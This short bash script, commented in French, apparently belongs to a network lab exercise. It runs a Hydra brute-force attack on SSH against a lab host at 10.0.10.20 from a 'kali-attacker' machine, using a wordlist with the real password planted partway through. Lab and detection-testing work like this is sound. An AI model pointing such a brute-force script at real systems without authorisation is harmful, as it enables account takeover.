#!/bin/bash
# Scénario B — Brute force SSH (Hydra)
# Itération : 2
# Cible : ssh-eurostar 10.0.10.20
# Exécuter depuis la machine kali-attacker dans GNS3

TARGET="10.0.10.20"
PORT=22
WORDLIST="$(dirname "$0")/wordlist_scenario_B.txt"
USER="eurostar"

echo "[*] Scénario B — Brute force SSH Hydra"
echo "[*] Cible : $TARGET:$PORT"
echo "[*] Utilisateur : $USER"
echo "[*] Wordlist : $WORDLIST ($(wc -l < "$WORDLIST") entrées, mot de passe réel en position 120)"
echo "[*] Début : $(date)"

hydra -l $USER -P "$WORDLIST" -t 4 -f ssh://$TARGET:$PORT -V

echo "[*] Fin : $(date)"
